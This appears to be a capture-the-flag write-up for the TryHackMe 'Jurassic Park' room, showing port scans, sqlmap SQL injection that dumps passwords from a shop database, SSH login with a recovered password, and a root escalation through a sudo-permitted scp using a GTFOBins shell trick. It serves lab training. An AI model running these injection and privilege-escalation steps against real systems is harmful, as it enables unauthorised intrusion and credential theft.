# Jurassic Park

Jurassic Park is a room from TryHackMe. [Here the link](https://tryhackme.com/room/jurassicpark).

The room's description says: 
"_This medium-hard task will require you to enumerate the web application, get credentials to the server and find 5 flags hidden around the file system..._"

The questions to answer for complete the room are the following:

1. What is the SQL database called which is serving the shop information? 
2. How many columns does the table have? 
3. Whats the system version? 
4. What is dennis' password? 
5. Locate and get the first flag contents. 
6. Whats the contents of the second flag? 
7. Whats the contents of the third flag? 
8. There is no fourth flag. 
9. Whats the contents of the fifth flag? 



Our target is located at **10.10.251.164** (for you this IP will be different). 
I personally am connected via VPN, so I do have access to the target machine from my Kali machine.

Let's begin!

## STEP 1

I opened my terminal, I'm actually using [Terminator](https://terminator-gtk3.readthedocs.io/en/latest/), split the screen and launched 2 scans:

1. `nmap -sC -sV -O -v -oN scans/nmap_initial 10.10.251.164`
    I used [nmap](https://nmap.org/) for scan the most common port of our target. I used the OS Detection(-O) and Version Detection (-sV) flags in addition to the default scripts (-sC). Added a bit of verbosity (-v) and save the scan in a file called nmap_initial.
2. `rustscan -a 10.10.251.164 -r 1-65535 | tee scans/rustscan`
    I used [rustscan](https://rustscan.github.io/RustScan/) for check if other ports, besides the well-know ones, are also open.
    
    <sub>[Nmap scan report](https://github.com/VitoBonetti/THM-WriteUp/blob/main/Jurassic_Park/scans/nmap_initial) | 
    [Rustscan scan report](https://github.com/VitoBonetti/THM-WriteUp/blob/main/Jurassic_Park/scans/rustscan)</sub>

Apparently we have only 2 ports open: 22 and 80.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:de:7b:a0:7c:be:93:a4:9f:7e:4c:2c:99:85:5f:f2 (RSA)
|   256 b7:b2:a8:6c:ba:c7:74:6d:b8:ed:f8:ef:8b:c5:07:6f (ECDSA)
|_  256 60:58:59:ec:d6:6d:1e:a7:56:6d:b5:62:d3:40:13:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Jarassic Park
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 019A6B943FC3AAA6D09FBA3C139A909A
|_http-server-header: Apache/2.4.18 (Ubuntu)

```

## STEP 2

In one of the terminal I runned [gobuster](https://github.com/OJ/gobuster), for discover eventualy hidden folder.

`gobuster dir -u http://10.10.251.164 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scans/gobuster`

<sub>[Gobuster scan report](https://github.com/VitoBonetti/THM-WriteUp/blob/main/Jurassic_Park/scans/gobuster)</sub>

In the while, because the port 80 is open, i will check if there is a website running.
And indeed the website is there.
The source code does not reveal anything useful. There is only one link to _shop.php_.
On the _shop.php_ page I could find 3 link for purchase different type of tickets for the Park, or I believe so. Anyway the thing that took my attention was the format of those three links.

```
item=php?id=1
item=php?id=2
item=php?id=3
```

I thought "_Will there be a database?_". So i lauched BurpSuite, captured the request for one of the three links and saved it to a txt file.

Back to Gobuster, apparently there is a _delete_ folder accessable. I did navigate to that address and got this

```
New priv esc for Ubunut??

Change MySQL password on main system!
```

Not sure what to do about this information but I will keep note of it anyway.

## STEP 3 <sub>(questions 1,2 and 3)</sub>


With the Burp request saved, I tryed to see if a database is really there using [sqlmap](https://sqlmap.org/)

`sqlmap -r files/burp_request.txt --dbs`

sqlmap will ask you how to proceed during the scan. For semplicity just push enter, so it runs with the default settings.
At the end of the scan I could check that there is indeed a database, and I got all the information for **answer at the first three questions**.

## STEP 4 <sub>(question 4)</sub>

The question number 4 ask us to find the password for the user _dennis_.
So I started to search deep in the database of the Jurassic Park.

```
sqlmap -r files/burp_request.txt -D <redacted> --tables
sqlmap -r files/burp_request.txt -D <redacted> -T <redacted> --columns
sqlmap -r files/burp_request.txt -D <redacted> -T <redacted> --sql-query "SELECT * FROM <redacted>"
```

Here I got 2 results. I could see 2 password but the username were missing. 
I tryed both and what you need to know that one of the two is the right one.
I kept note of the other password, just in case.
    
## STEP 5 <sub>(question 5)</sub>

I tryed to ssh with the dennis credential and it did work!!

```
# ssh dennis@10.10.251.164
dennis@10.10.251.164's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

62 packages can be updated.
45 updates are security updates.


Last login: Wed Sep  7 08:45:47 2022 from 10.18.86.39
dennis@ip-10-10-251-164:~$ whoami
dennis
dennis@ip-10-10-251-164:~$ pwd
/home/dennis
dennis@ip-10-10-251-164:~$ ls -la
total 44
drwxr-xr-x 3 dennis dennis 4096 Sep  7 08:45 .
drwxr-xr-x 4 root   root   4096 Feb 16  2019 ..
-rw------- 1 dennis dennis 1052 Sep  7 08:47 .bash_history
-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
-rw-r--r-- 1 dennis dennis 3771 Feb 16  2019 .bashrc
drwx------ 2 dennis dennis 4096 Sep  7 08:45 .cache
-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt <------- LOOK AT ME -------|
-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
-rw-rw-r-- 1 dennis dennis   32 Feb 16  2019 test.sh
-rw------- 1 dennis dennis 4350 Feb 16  2019 .viminfo
dennis@ip-10-10-251-164:~$ cat flag1.txt

<redacted>
```
We are in the dennis home together with the first flag ;)

## STEP 6 <sub>(questions 6, 8 and 9)</sub>

Now I needed to find the other four flag. Actually three because apparently the flag 4 do not exist: 
_8. There is no fourth flag._

I runned this command:
```
dennis@ip-10-10-251-164:~$ find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
<redacted>
-rw-r--r-- 1 root   root      33 Feb 16  2019 /boot/grub/fonts/flagTwo.txt  <------- LOOK AT ME -------|
<redacted>
```
and I also had permission to read it. Great :D

`dennis@ip-10-10-251-164:~$ cat /boot/grub/fonts/flagTwo.txt`

2 Flags to go. In the dennis home there was a file called _test.sh_, and looks pretty unusual to me.
```
dennis@ip-10-10-251-164:~$ ls -la
total 44
drwxr-xr-x 3 dennis dennis 4096 Sep  7 08:45 .
drwxr-xr-x 4 root   root   4096 Feb 16  2019 ..
-rw------- 1 dennis dennis 1052 Sep  7 08:47 .bash_history
-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
-rw-r--r-- 1 dennis dennis 3771 Feb 16  2019 .bashrc
drwx------ 2 dennis dennis 4096 Sep  7 08:45 .cache
-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
-rw-rw-r-- 1 dennis dennis   32 Feb 16  2019 test.sh  <------- LOOK AT ME -------|
-rw------- 1 dennis dennis 4350 Feb 16  2019 .viminfo

dennis@ip-10-10-251-164:~$ cat test.sh 
#!/bin/bash
cat /root/flag5.txt
```
So I Know now the location of the flag number 5, shall I actually run the script?
```
dennis@ip-10-10-251-164:~$ bash test.sh 
cat: /root/flag5.txt: Permission denied

dennis@ip-10-10-251-164:~$ chmod +x test.sh 
dennis@ip-10-10-251-164:~$ ./test.sh 
cat: /root/flag5.txt: Permission denied
```

Of course not. I need to escalate privilages.
I thought it was time to figure out how to use the second password I had found, but first I decided to check if dennis had any sudo privilages with the command `sudo -l`, and...BOOM
```
dennis@ip-10-10-251-164:~$ sudo -l
Matching Defaults entries for dennis on ip-10-10-251-164.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-10-251-164.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp <------- LOOK AT ME -------|
```

I checked immediatly on [GFTOBins](https://gtfobins.github.io/) and found this for scp

>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
>``` 
>TF=$(mktemp)
>echo 'sh 0<&2 1>&2' > $TF
>chmod +x "$TF"
>sudo scp -S $TF x y:
>```

Let's se if it works and
```
dennis@ip-10-10-251-164:~$ TF=$(mktemp)
dennis@ip-10-10-251-164:~$ echo 'sh 0<&2 1>&2' > $TF
dennis@ip-10-10-251-164:~$ chmod +x "$TF"
dennis@ip-10-10-251-164:~$ sudo /usr/bin/scp -S $TF x y:
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/flag5.txt
```
I'm root, so I could easily read the flag5.txt

## STEP 7 <sub>(question 7)</sub>

At this point I was only missing flag 3 (question 7) to complete the room. I ran several find commands but to no avail! So I decided to start all over again from where I started: in **_dennis's home_**.
Checking the contents of the _.bash_history_ I found flag 3.
```
root@ip-10-10-251-164:/dennis/home~$ ls -la
total 44
drwxr-xr-x 3 dennis dennis 4096 Sep  7 08:45 .
drwxr-xr-x 4 root   root   4096 Feb 16  2019 ..
-rw------- 1 dennis dennis 1052 Sep  7 08:47 .bash_history
-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
-rw-r--r-- 1 dennis dennis 3771 Feb 16  2019 .bashrc
drwx------ 2 dennis dennis 4096 Sep  7 08:45 .cache
-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
-rw-rw-r-- 1 dennis dennis   32 Feb 16  2019 test.sh
-rw------- 1 dennis dennis 4350 Feb 16  2019 .viminfo
root@ip-10-10-251-164:/dennis/home~$  cat .bash_history
Flag3:<redacted>  <------- LOOK AT ME -------|
sudo -l
sudo scp
scp
sudo find
<redacted>
```

Mission accomplished!





